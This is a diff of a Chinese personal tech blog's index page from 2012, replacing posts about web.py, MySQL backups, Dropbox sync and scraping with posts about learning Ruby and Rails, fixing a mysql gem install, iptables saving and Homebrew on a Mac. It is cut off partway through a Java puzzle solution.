@@ -7,7 +7,7 @@
 	<meta name="author" content="dawncold">
 
 	
-	<meta name="description" content="本来做了个一个todo的app感觉python写web app真得好快啊，于是想加入一个user的功能，这样注册的用户就可以写自己的todo了，不过这么一加才感觉到web.py真不好用了，特别是session，还有templates也不怎么好用，官方的文档不知道为何也不给个完整版的， &hellip;">
+	<meta name="description" content="现在有些后悔买的那本书了，《web开发敏捷之道第三版》，那本书的代码使用的是rails2.2.2，真够2的，现在用的是3.2.1，作者说有不少代码已经更改了，但没想到会差得连我都能看出来，我只是个初学者啊！好在我还能稍稍应付自如，后面可能就会更加累了！ &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -79,14 +79,18 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/06/webpy-frameworks-is-not-convinent-to-use/">
+		<a href="/blog/2012/02/09/egg-ache-no-route-matches-say-hello/">
 		
-			web.py真不好用</a>
+			蛋疼的No Route Matches “/say/hello”</a>
 	</h2>
 	<div class="entry-content">
-		<p>本来做了个一个todo的app感觉python写web app真得好快啊，于是想加入一个user的功能，这样注册的用户就可以写自己的todo了，不过这么一加才感觉到web.py真不好用了，特别是session，还有templates也不怎么好用，官方的文档不知道为何也不给个完整版的，api只是写出来了，但基本都不说是什么作用，想清楚知道运行机制那就得看源代码了，还好不“那么”长！</p>
+		<p>现在有些后悔买的那本书了，《web开发敏捷之道第三版》，那本书的代码使用的是rails2.2.2，真够2的，现在用的是3.2.1，作者说有不少代码已经更改了，但没想到会差得连我都能看出来，我只是个初学者啊！好在我还能稍稍应付自如，后面可能就会更加累了！</p>
 
-<p>哎，暂时就放一下web.py吧！到头来过度依赖框架绝对不是什么好事，嗯，不是什么好兆头现在的我！</p>
+<p>一开始在helloworld部分就遇到一个问题，用rails generate controller say后根本不能自动添加一条routes，找了原作者的wiki更新发现这里已经需要自己修改routes的内容了，不过也好，消去一行注释即可：）</p>
+
+<p>感谢<a href="http://www.xiaoyangsheng.com/2011/02/routing-error-no-route-matches-sayhello/">这里</a></p>
+
+<p>如果还有谁遇到类似不兼容问题，请看<a href="http://pragprog.com/wikis/wiki/ChangesToRails">作者的wiki更新</a>吧，希望有帮助！</p>
 
 		
 		
@@ -106,11 +110,11 @@
   
 
 
-<time datetime="2012-05-06T16:31:00+08:00" pubdate data-updated="true">May 6<span>th</span>, 2012</time></div>
+<time datetime="2012-02-09T23:01:00+08:00" pubdate data-updated="true">Feb 9<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/webpy/'>webpy</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/ror/'>ror</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
@@ -122,16 +126,164 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/02/mysql-issue/">
+		<a href="/blog/2012/02/09/some-issue-when-installing-mysql-ruby-driver/">
 		
-			网站都挂掉了</a>
+			安装mysql的Ruby驱动遇到的问题</a>
 	</h2>
 	<div class="entry-content">
-		<p>突然发现mysql无法用localhost连接进去，而用127.0.0.1可以。</p>
+		<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>dawncold@tianzhenmatoMacBook-Pro ~<span class="nv">$ </span>gem install mysql
+</span><span class='line'>Fetching: mysql-2.8.1.gem <span class="o">(</span>100%<span class="o">)</span>
+</span><span class='line'>Building native extensions.  This could take a <span class="k">while</span>...
+</span><span class='line'>ERROR:  Error installing mysql:
+</span><span class='line'>ERROR: Failed to build gem native extension.
+</span><span class='line'>
+</span><span class='line'>       /usr/local/Cellar/ruby/1.9.3-p0/bin/ruby extconf.rb
+</span><span class='line'>checking <span class="k">for </span>mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>checking <span class="k">for </span>main<span class="o">()</span> in -lm... yes
+</span><span class='line'>checking <span class="k">for </span>mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>checking <span class="k">for </span>main<span class="o">()</span> in -lz... yes
+</span><span class='line'>checking <span class="k">for </span>mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>checking <span class="k">for </span>main<span class="o">()</span> in -lsocket... no
+</span><span class='line'>checking <span class="k">for </span>mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>checking <span class="k">for </span>main<span class="o">()</span> in -lnsl... no
+</span><span class='line'>checking <span class="k">for </span>mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>checking <span class="k">for </span>main<span class="o">()</span> in -lmygcc... no
+</span><span class='line'>checking <span class="k">for </span>mysql_query<span class="o">()</span> in -lmysqlclient... no
+</span><span class='line'>*** extconf.rb failed ***
+</span><span class='line'>Could not create Makefile due to some reason, probably lack of
+</span><span class='line'>necessary libraries and/or headers.  Check the mkmf.log file <span class="k">for </span>more
+</span><span class='line'>details.  You may need configuration options.
+</span><span class='line'>
+</span><span class='line'>Provided configuration options:
+</span><span class='line'>--with-opt-dir
+</span><span class='line'>--without-opt-dir
+</span><span class='line'>--with-opt-include
+</span><span class='line'>--without-opt-include<span class="o">=</span><span class="k">${</span><span class="nv">opt</span><span class="p">-dir</span><span class="k">}</span>/include
+</span><span class='line'>--with-opt-lib
+</span><span class='line'>--without-opt-lib<span class="o">=</span><span class="k">${</span><span class="nv">opt</span><span class="p">-dir</span><span class="k">}</span>/lib
+</span><span class='line'>--with-make-prog
+</span><span class='line'>--without-make-prog
+</span><span class='line'>--srcdir<span class="o">=</span>.
+</span><span class='line'>--curdir
+</span><span class='line'>--ruby<span class="o">=</span>/usr/local/Cellar/ruby/1.9.3-p0/bin/ruby
+</span><span class='line'>--with-mysql-config
+</span><span class='line'>--without-mysql-config
+</span><span class='line'>--with-mysql-dir
+</span><span class='line'>--without-mysql-dir
+</span><span class='line'>--with-mysql-include
+</span><span class='line'>--without-mysql-include<span class="o">=</span><span class="k">${</span><span class="nv">mysql</span><span class="p">-dir</span><span class="k">}</span>/include
+</span><span class='line'>--with-mysql-lib
+</span><span class='line'>--without-mysql-lib<span class="o">=</span><span class="k">${</span><span class="nv">mysql</span><span class="p">-dir</span><span class="k">}</span>/lib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>--with-mlib
+</span><span class='line'>--without-mlib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>--with-zlib
+</span><span class='line'>--without-zlib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>--with-socketlib
+</span><span class='line'>--without-socketlib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>--with-nsllib
+</span><span class='line'>--without-nsllib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>--with-mygcclib
+</span><span class='line'>--without-mygcclib
+</span><span class='line'>--with-mysqlclientlib
+</span><span class='line'>--without-mysqlclientlib
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Gem files will remain installed in /usr/local/Cellar/ruby/1.9.3-p0/lib/ruby/gems/1.9.1/gems/mysql-2.8.1 <span class="k">for </span>inspection.
+</span><span class='line'>Results logged to /usr/local/Cellar/ruby/1.9.3-p0/lib/ruby/gems/1.9.1/gems/mysql-2.8.1/ext/mysql_api/gem_make.out
+</span></code></pre></td></tr></table></div></figure>
 
-<p>linux下是这样的，如果用localhost连接是走的socket路线，用127.0.0.1走的是tcp路线。</p>
 
-<p>修改了php.ini中的mysql.default_socket，值为mysql.sock的文件路径，重启php就好了，不过phpmyadmin的问题依然没有解决，我只是把连接主机换成了127.0.0.1暂时用着。</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>是Mac平台，安装了MySQL5.5.20，搜索了一番，似乎是因为已经安装了mysql没有指定已安装的mysql路径出现的问题，于是指定一个过去：
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>bash
+gem install mysql &mdash; &mdash;with-mysql-dir=/usr/local/mysql
+&#8220;`</p>
+
+<p>一开始的那两个“&mdash;”不能省略，而且发现参数中那个等号左右最好别带空格，我是代码习惯了等号周围加空格，在这里竟然会出错。</p>
+
+<p>我已经解决问题了，成功安装mysql的ruby驱动，如果仍然遇到问题，可以试试参考<a href="http://blog.bmn.name/2008/02/rails-gem-install-mysql-throws-error-extconfrb-failed/">这里</a>（同样感谢这里）。</p>
 
 		
 		
@@ -151,11 +303,11 @@
   
 
 
-<time datetime="2012-05-02T18:17:00+08:00" pubdate data-updated="true">May 2<span>nd</span>, 2012</time></div>
+<time datetime="2012-02-09T20:08:00+08:00" pubdate data-updated="true">Feb 9<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/mysql/'>mysql</a>, <a class='category' href='/blog/categories/socket/'>socket</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/ruby/'>ruby</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
@@ -167,45 +319,32 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/27/backup-mysql-databases-using-python/">
+		<a href="/blog/2012/02/07/some-issue-when-saving-rules-in-iptables/">
 		
-			用python备份mysql</a>
+			保存iptables规则遇到的问题</a>
 	</h2>
 	<div class="entry-content">
-		<p>备份数据库的重要性不想多说了。</p>
+		<p>开了vps竟然没开vpn简直是罪过了，只是因为前段时间vps升级到了centos6，挺多东西支持不好，于是安装vpn也就失败了，现在已经没问题了，刚刚用iPad测试了vpn可用。</p>
 
-<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
-# coding: utf-8
+<p>在保存iptables规则的时候遇到这样的问题：</p>
 
-import os
-import sys
-from datetime import *
-import time
-
-#mysql's path
-mysql_path = '/usr/local/mysql/bin/'
-#edit this if your mysql username and password is not like this:
-mysql_username = 'root'
-mysql_password = 'xxxxxx'
-#backup path
-backup_path = 'mysqlbackup/'
-
-def validate_backup_path():
-if os.path.exists(backup_path) == False:
-print "I create a directory here: %s " % backup_path
-os.mkdir(backup_path)
-
-def backup_all_databases():
-filename = "all_%s.sql" % (datetime.utcfromtimestamp(time.time()))
-os.system("%smysqldump -u%s -p%s --all-databases &gt; '%s%s'" % (mysql_path, mysql_username, mysql_password, backup_path, filename))
-
-if __name__ == "__main__":
-validate_backup_path()
-backup_all_databases()
-print "finish!!!"</pre>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>iptables: Saving firewall rules to /etc/sysconfig/iptables: /etc/init.d/iptables: line 268: restorecon: <span class="nb">command </span>not found
+</span></code></pre></td></tr></table></div></figure>
 
 
-<p>这个是修改了一次的备份脚本，本来是分数据库备份的，无奈制定了分数据库备份需要输入密码，这就不容易加入cron来自动完成了，不过听说在my.cnf中加入mysqldump的设置可以避免输入账号密码，这也算是一个办法吧，不过还是本着简化的思想，只导出所有数据库出来就好，配合着上一篇的dropbox自动备份，这样VPS的灾备就稍稍好些了：）</p>
+<p>`</p>
+
+<p>当然你可能会看到中文的提示（我的就是），意思是一样的。从<a href="http://www.live-in.org/archives/1112.html">这里</a>得到了解决方案：</p>
+
+<p>安装一个包包：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>yum install policycoreutils
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>行了，剩下就没遇到问题了：)</p>
 
 		
 		
@@ -225,11 +364,11 @@ print "finish!!!"</pre>
   
 
 
-<time datetime="2012-04-27T20:44:00+08:00" pubdate data-updated="true">Apr 27<span>th</span>, 2012</time></div>
+<time datetime="2012-02-07T18:03:00+08:00" pubdate data-updated="true">Feb 7<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/backup/'>backup</a>, <a class='category' href='/blog/categories/crontab/'>crontab</a>, <a class='category' href='/blog/categories/dropbox/'>dropbox</a>, <a class='category' href='/blog/categories/mysql/'>mysql</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/vps/'>vps</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/vps/'>vps</a>
 
 
 </div>
@@ -241,85 +380,16 @@ print "finish!!!"</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/27/auto-backup-data-in-vps-using-python-script-to-control/">
+		<a href="/blog/2012/02/06/wired-grammar-in-ruby/">
 		
-			dropbox自动备份VPS</a>
+			奇怪的Ruby语法</a>
 	</h2>
 	<div class="entry-content">
-		<p>在<a href="http://www.deepvps.com/dropbox-backup.html" target="_blank">这里</a>看过的文章，感觉很不错，于是发表过来，但发现有点问题，我就自己再改改。</p>
+		<p>今天断断续续把昨天提到的那个Ruby编程入门看完了，原本打算按照教程中的例子做一遍，不过看得时候感觉这样做的话有些浪费时间，对于有一定编程经验的人来说按照例子做一遍没多大意义，很多内容看看就过了。</p>
 
-<p>安装linux下的dropbox（我的是32为系统，如果是64位在下面地址末尾加上“_64”即可）：</p>
+<p>但很可惜，在Ruby这里，看看还不一定就能理解，要不然今天也不会单独写一篇日志了，真得有不少特性和其他编程语言不一样，概念上倒是还能理解，语法符号上就要重新接受了，想等过两天买的Ruby编程书来到后细细重头看。</p>
 
-<pre class="prettyprint linenums bush:bash" lang="bash">wget -O dropbox.tar.gz http://www.dropbox.com/download?plat=lnx.x86</pre>
-
-
-<p>解压后在.dropbox-dist目录中有dropboxd可执行文件，让其在后台执行（就是在执行文件后面加“&amp;”符号）</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">~/.dropbox-dist/dropboxd &amp;</pre>
-
-
-<p>此后会出现一个地址，你得复制出来然后在浏览器中打开，之后就是注册或者登陆dropbox，这样就激活了在这台机器上的dropbox，就可以同步文件了。</p>
-
-<p>把需要同步备份的文件软连接到Dropbox这个目录中：</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">cd ~/Dropbox
-ln -s /home/wwwroot/
-。。。</pre>
-
-
-<p>此时dropbox已经在帮你同步了，你可以通过web端观察。</p>
-
-<p>我看到的文章中带着一个自动运行的脚本，用sh写的，我发现在主机上运行没反应，不会sh，会点python，于是我改写了一下，也是可用的：</p>
-
-<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
-# coding: utf-8
-
-import sys
-import os
-
-def start():
-print "Starting Dropbox..."
-os.system("~/.dropbox-dist/dropboxd &amp;")
-
-
-def stop():
-print "Stoping Dropbox..."
-os.system("pkill dropbox")
-
-
-def restart():
-stop()
-start()
-
-
-if __name__ == "__main__":
-action = sys.argv[1]
-print "now action: %s" % action
-if action == 'start':
-start()
-elif action == "stop":
-stop()
-elif action == "restart":
-restart()
-else:
-print "Bad arguments!"</pre>
-
-
-<p>相应的crontab配置文件中这样写就好了：</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">#auto dropbox
-0 4 * * * python /root/dropbox.py restart
-0 5 * * * python /root/dropbox.py stop</pre>
-
-
-<p>如果没装crontab（极少情况），这样(也许你用apt-get来做这件事，我的是centos系统，用yum了)：</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">yum -y install crontab</pre>
-
-
-<p>python让我很快乐：）</p>
-
-<p>一开始在python用的是exec来执行命令发现不可用，于是用了os.system，查看pydoc才发现exec是执行python code用的……惭愧！</p>
+<p>还有20天了，真不知道当初设想的几个小理念能够实现多少，但也别失望，我还成功转型了呢，这个寒假收获将会颇丰！</p>
 
 		
 		
@@ -339,11 +409,11 @@ print "Bad arguments!"</pre>
   
 
 
-<time datetime="2012-04-27T17:51:00+08:00" pubdate data-updated="true">Apr 27<span>th</span>, 2012</time></div>
+<time datetime="2012-02-06T22:19:00+08:00" pubdate data-updated="true">Feb 6<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/dropbox/'>dropbox</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/vps/'>vps</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/ruby/'>ruby</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
@@ -355,62 +425,20 @@ print "Bad arguments!"</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/20/grub-table-from-html-using-pything/">
+		<a href="/blog/2012/02/06/firstly-study-ruby/">
 		
-			抓取一些网页上的表格</a>
+			开学Ruby</a>
 	</h2>
 	<div class="entry-content">
-		<p>这些表格是所有参加比赛的学生成绩单，当然只有省份、学校、准考证、姓名、组别、奖项、是否进入决赛这几个列，我用python写的脚本来抓取，存入了本地的一个excel中，所以除了python环境之外还需要xlwt这个包包：）</p>
+		<p>先从官方文档那里找各种资料学习，已经在amazon上买书了，买了本rails应用的书，还买了两本考系统架构师的书，再就是想买一本讲ruby语言的书，很可惜amazon上没货，要是从非amazon商家买的话需要支付高昂的快递费，于是从淘宝上找了家靠谱的商家，还有满49包邮（幸亏这本书是51，包邮了）</p>
 
-<pre class="prettyprint linenums bush:python" lang="python">#/usr/bin/env python
-#coding: utf-8
+<p>对了，今天在amazon上买书是因为收到了amazon前段时间送的满100送20优惠券，对于我这种很喜欢在amazon上买技术书籍的书虫来说这类活动太好了，以后多多参加！</p>
 
-import urllib2
-import re
-import xlwt
+<p>说废话太多了，今天断断续续看了这里的教程，基本想要按照讲得做，看完一半了，明天把剩下弄完！</p>
 
-link_list = []
-xls = xlwt.Workbook()
-table = xls.add_sheet("main")
+<p>教程地址：<a href="http://pine.fm/LearnToProgram/">http://pine.fm/LearnToProgram/</a></p>
 
-for i in xrange(288, 318):
-link_list.append("http://www.lanqiao.org/Article/ShowArticle.asp?ArticleID=%d"%i)
-
-chinese = []
-content = ''
-while len(link_list) &gt; 0:
-for link in link_list:
-print link
-try:
-content = urllib2.urlopen(url = link, timeout = 3).read()
-link_list = link_list[1:]
-except:
-print "timeout!"
-if link not in link_list[1:]:
-link_list.append(link)
-some = re.findall(u'&lt;TR.*?&lt;\/TR&gt;', content.decode('gbk', 'ignore'), re.S)
-for s in some:
-chinese_value = re.findall(u'(?&lt;=\u5b8b\u4f53&gt;).*(?=&lt;\/FONT&gt;)', s)
-chinese.append(','.join(chinese_value))
-
-for line in xrange(0, len(chinese)):
-tmp = chinese[line].split(',')
-for i in xrange(0, len(tmp)):
-table.write(line, i, tmp[i])
-print "%d, %d, %s" % (line, i, tmp[i])
-
-xls.save('x.xls')
-print len(link_list)</pre>
-
-
-<p>链接抓取超时的时候会自动重新抓取，最终就有了一个叫x.xls的表格。其中有个省的数据有问题，可以在筛选中看到奖项这里面有个垃圾数据项，自己改改吧。</p>
-
-<p>里面的正则表达式耗费了我好久时间！！！不过我还是很欣慰能找到这行：</p>
-
-<pre class="prettyprint linenums bush:python" lang="python">(?&lt;=\u5b8b\u4f53&gt;).*(?=&lt;\/FONT&gt;)</pre>
-
-
-<p>前面两个unicode是“宋体”，这个得看具体的html代码了，所以这个脚本没什么通用性……</p>
+<p>ruby的中文参考文档页：<a href="http://www.ruby-lang.org/zh_cn/documentation/">http://www.ruby-lang.org/zh_cn/documentation/</a></p>
 
 		
 		
@@ -430,11 +458,11 @@ print len(link_list)</pre>
   
 
 
-<time datetime="2012-04-20T09:34:00+08:00" pubdate data-updated="true">Apr 20<span>th</span>, 2012</time></div>
+<time datetime="2012-02-06T00:40:00+08:00" pubdate data-updated="true">Feb 6<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/html/'>html</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/regex/'>regex</a>, <a class='category' href='/blog/categories/table/'>table</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/ruby/'>ruby</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
@@ -446,16 +474,62 @@ print len(link_list)</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/16/google-code-jam-2012/">
+		<a href="/blog/2012/02/05/update-ruby-on-mac/">
 		
-			Code Jam 2012</a>
+			更新Mac下的ruby</a>
 	</h2>
 	<div class="entry-content">
-		<p>资格赛已经结束了，还好做出来几个题，现在来看这些题目都不算是特别有难度，最主要的还是在理解题目的要求，这当然对于我们非英语系国家的人来说是有些困难的，可能我们需要多读几遍题目才能开始编码，这确实有些不利，但最主要的还是理解错了题目，这样才可怕。</p>
+		<p>刚刚说了要开始学ruby了，但发现Mac下的ruby版本挺低的，才1.8.7，现在官方的都1.9.3了，于是更新，发现这个更新不大容易，到底现在该不该爱Mac呢？！</p>
 
-<p>第二个题我就理解有些问题，考虑得太多了，看优秀选手的代码，才十几行结束，真是羡慕死我了！！！</p>
+<p>修改一下/usr/local的权限：(如果不修改的话，或许会出现通过brew安装的软件无法自动创建符号链接到/usr/local/bin中的情况，如果不能自动创建链接过去的话，麻烦是一个方面，关键是后面做的一些工作基本都白费了，可能你运行的一个软件是在/usr/bin中存在的，那样就不会自动搜索到你用brew安装的那个了。详情找找brew的工作原理吧：)</p>
 
-<p>下一轮比赛可能就要在家做了吧？毕竟到了我跑回家的日子：）</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>sudo chown -R <span class="sb">`</span>whoami<span class="sb">`</span> /usr/local
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>首先我用了大家推荐的Homwbrew管理工具，这里安装完homebrew后需要在自己的bash配置文件中加入新的path：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/bin:<span class="nv">$PATH</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>把这行加入到bash_profile中吧，这样就能让homebrew发挥作用了，你首先就能用上更新了的程序而不是从默认路径查找。（如果以前用了MacPorts的话你也会和我一样看到MacPorts的export命令，要去掉他们，或者你把Homebrew的export命令写在下面，这样能覆盖掉，既然我已经删除了MacPorts，所以干脆删除掉！）</p>
+
+<p>关闭terminal，重新加载刚才的bash_profile，这样就能用Homebrew了。</p>
+
+<p>首先安装git，自己和Homwbrew都用得到：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>brew install git
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>接着更新一下Homebrew的源：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>brew update
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>然后安装了ruby后就能用gem来更新系统了：</p>
+
+<p>安装ruby：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>brew install ruby
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>更新系统：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gem update --system
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>后面的安装rails等操作就可以用gem来做了，看看自己的ruby版本，已经是1.9.3p0(2011-10-30)</p>
 
 		
 		
@@ -475,11 +549,11 @@ print len(link_list)</pre>
   
 
 
-<time datetime="2012-04-16T13:20:00+08:00" pubdate data-updated="true">Apr 16<span>th</span>, 2012</time></div>
+<time datetime="2012-02-05T00:00:00+08:00" pubdate data-updated="true">Feb 5<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/code-jam/'>Code jam</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/mac/'>mac</a>, <a class='category' href='/blog/categories/ruby/'>ruby</a>
 
 
 </div>
@@ -491,134 +565,43 @@ print len(link_list)</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/04/08/9-numbers-calculate-110/">
+		<a href="/blog/2012/02/04/uninstall-macports/">
 		
-			9个数运算结果为110</a>
+			删除MacPorts</a>
 	</h2>
 	<div class="entry-content">
-		<p>昨天参加了一个小型编程比赛，有个题目是这样的，有1～9这九个数字，按照顺序排列着，你可以在他们之间加入加号、减号或者什么都不加，组成的算式经过运算后结果为110的输出出来。</p>
-
-<p>看着好简单的题目，当时比赛时候就是一下子没做出来，现在做好了，贴出来，如果有需要可以拿去用哈，代码风格不算好，因为是比赛嘛，又不是商业项目，先快速得到结果再说！</p>
-
-<pre class="prettyprint linenums bush:java" lang="java">import java.util.ArrayList;
-
-
-public class unittest
-{
-   public static void main(String[] argStrings)
-   {
-       long start = System.currentTimeMillis();
-       ArrayList&lt;String&gt; allopts = new ArrayList&lt;String&gt;();
-       int a,b,c,d,e,f,g,h;
-       for(a = 0;a &lt; 3;a++)
-           for(b = 0;b &lt; 3;b++)
-               for(c = 0;c &lt; 3;c++)
-                   for(d = 0;d &lt; 3;d++)
-                       for(e = 0;e &lt; 3;e++)
-                           for(f = 0;f &lt; 3;f++)
-                               for(g = 0;g &lt; 3;g++)
-                                   for(h = 0;h &lt; 3;h++) {
-                                       allopts.add(""+a+b+c+d+e+f+g+h);
-                                   }
-       
-       for (String string : allopts)
-       {
-           String base = "1x2x3x4x5x6x7x8x9";
-           for (int i = 0; i &lt; string.length(); i++)
-           {
-               String tmp = getOpt(Integer.parseInt(""+string.charAt(i)));
-               base = base.replaceFirst("x", tmp);
-           }
-           int x = getResult(base, string.replaceAll("2", "").replaceAll("0", "+").replaceAll("1", "-"));//2-&gt;null
-           if (x == 110)
-           {
-               System.out.println(base);
-           }
-       }
-       System.out.println("All Run Time: " + (System.currentTimeMillis() - start) + "ms");
-   }
-   
-   public static String getOpt(int opt) {
-       String retString = "";
-       switch (opt)
-       {
-           case 0:
-               retString = "+";
-               break;
-           case 1:
-               retString = "-";
-               break;
-           case 2:
-               retString = "";
-               break;
-           default:
-               break;
-       }
-       
-       return retString;
-   }
-   
-   public static int getResult(String calculatString, String optString)
-   {
-       ArrayList&lt;Integer&gt; allNum = new ArrayList&lt;Integer&gt;();
-       ArrayList&lt;String&gt; allOpt = new ArrayList&lt;String&gt;();
-       for (String string : calculatString.split("[+-]"))
-       {
-           allNum.add(Integer.parseInt(string));
-       }
-       for (int i = 0; i &lt; optString.length(); i++)
-       {
-           allOpt.add(optString.charAt(i) + "");
-       }
-       int result = allNum.get(0);
-       for (int i = 1; i &lt; allNum.size(); i++)
-       {
